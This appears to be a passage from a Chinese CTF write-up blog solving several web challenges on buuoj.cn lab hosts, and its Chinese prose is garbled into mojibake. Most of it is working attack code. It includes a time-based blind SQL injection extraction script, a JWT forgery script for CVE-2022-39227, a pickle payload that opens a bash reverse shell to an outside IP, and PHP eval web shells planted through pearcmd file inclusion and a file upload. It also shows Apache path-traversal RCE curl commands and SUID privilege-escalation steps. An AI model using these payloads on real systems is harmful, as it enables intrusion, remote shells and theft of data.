Id,username,password,cookie</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_comments&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># id,text,user,name,display</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(id)%0bfrom%0bwfy.wfy_comments),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># 1,2,3,4,5,6,7,8,9,10,11,100</span></span><br><span class="line"><span class="comment"># tpl = &quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(user)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"><span class="comment"># f1ag_is_here</span></span><br><span class="line">tpl = <span class="string">&quot;1%0band%0bif(ascii(substr((select%0bgroup_concat(text)%0bfrom%0bwfy.wfy_comments%0bwhere%0bid=100),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(&#123;SLEEP&#125;),1)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.trust_env = <span class="literal">False</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    lo, hi = <span class="number">32</span>, <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        payload = tpl.<span class="built_in">format</span>(i=i, mid=mid, SLEEP=SLEEP)</span><br><span class="line">        t0 = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sess.post(url, headers=headers, data=<span class="string">f&quot;name=<span class="subst">&#123;payload&#125;</span>&quot;</span>.encode(), timeout=<span class="number">8</span>, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        dt = time.time() - t0</span><br><span class="line">        <span class="keyword">if</span> dt &gt;= TH:</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line">    <span class="keyword">if</span> lo == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += <span class="built_in">chr</span>(lo)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Ye‚Äôs-Pickle"><a href="#Ye‚Äôs-Pickle" class="headerlink" title="Ye‚Äôs Pickle"></a>Ye‚Äôs Pickle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># ÂåÖÂê´Â≠óÊØçÂíåÊï∞Â≠ó</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Áî®<strong>CVE-2022-39227</strong>‰º™ÈÄ†JWTÔºåÁÑ∂ÂêéÂÜçËøõË°åpickleÂèçÂ∫èÂàóÂåñÔºåÂèçÂºπshellÂç≥ÂèØ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">originaltoken = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg&#x27;</span></span><br><span class="line">topic = topic(originaltoken)</span><br><span class="line"><span class="built_in">print</span>(topic)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?token=%7B%22++eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22%3A%22%22%2C%22protected%22%3A%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22%2C+%22payload%22%3A%22eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22%2C%22signature%22%3A%22bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg%22%7D%0A</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJyb2xlIjoiZ3Vlc3QifQ.aJcpRw.vYpg4Q0XL9337e8MB6kQKifcm28</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.88.15.146/6666 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂàöÂ•ΩpayloadÈáåÈù¢Êúâ‰∏™<code>+</code>ÔºåÂøòËÆ∞ÁºñÁ†Å‰∫Üemm</p>
<h2 id="4-Â§çÁõò"><a href="#4-Â§çÁõò" class="headerlink" title="4-Â§çÁõò"></a>4-Â§çÁõò</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/header.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;inc/sidebar.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;!-- Content Wrapper. Contains page content --&gt;</span><br><span class="line"></span><br><span class="line">  <span class="meta">&lt;?php</span> </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">          <span class="variable">$page</span> =<span class="string">&#x27;pages/&#x27;</span> .<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$page</span> = <span class="string">&#x27;pages/dashboard.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="variable">$page</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">require_once</span> <span class="string">&#x27;pages/error_page.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">  &lt;!-- Control Sidebar --&gt;</span><br><span class="line">  &lt;aside <span class="class"><span class="keyword">class</span>=&quot;<span class="title">control</span>-<span class="title">sidebar</span> <span class="title">control</span>-<span class="title">sidebar</span>-<span class="title">dark</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;!-- <span class="title">Control</span> <span class="title">sidebar</span> <span class="title">content</span> <span class="title">goes</span> <span class="title">here</span> --&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">aside</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;!-- /.<span class="title">control</span>-<span class="title">sidebar</span> --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"> &lt;?<span class="title">php</span> <span class="title">require_once</span> &#x27;<span class="title">inc</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;; ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Êñá‰ª∂ÂåÖÂê´ÔºåÂèØ‰ª•Êâìpearcmd</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+shell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÊùÉÈôê‰∏çÂ§üÁúãflagÔºå<code>suid</code>ÊèêÊùÉ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">gzip -f /flag -t  </span><br></pre></td></tr></table></figure>

<h2 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/unknown404/p/10176272.html">https://www.cnblogs.com/unknown404/p/10176272.html</a> apacheËß£ÊûêÊºèÊ¥û</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarylzTW48ByROVxArdw</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>318</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.php.aaa&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Êèê‰∫§</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarylzTW48ByROVxArdw--</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>

<h2 id="Unsafe-Apache"><a href="#Unsafe-Apache" class="headerlink" title="Unsafe Apache"></a>Unsafe Apache</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60905276/article/details/125163219">https://blog.csdn.net/qq_60905276/article/details/125163219</a></p>
<p>Ëøô‰∏™Ê¥ûÊàë‰∏ä‰∏™ÊúàÂÆû‰π†ÁöÑÊó∂ÂÄôËøòÂàöÂ•ΩÊâìËøá</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --data <span class="string">&quot;echo;ls /&quot;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh</span><br><span class="line"></span><br><span class="line">curl --data <span class="string">&quot;echo;tac /ffffllllaaagggg_cc084c485d&quot;</span> http://node5.buuoj.cn:27486/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh</span><br></pre></td></tr></table></figure>

<h2 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|curl/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ÂèØ‰ª•ÂÜôÂÖ•Êñá‰ª∂</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?cmd=echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs= | base64 -d &gt; shell.php</span><br><span class="line"></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">date -f /ffll444aaggg</span><br></pre></td></tr></table></figure>

<h2 id="Include-üçê"><a href="#Include-üçê" class="headerlink" title="Include üçê"></a>Include üçê</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

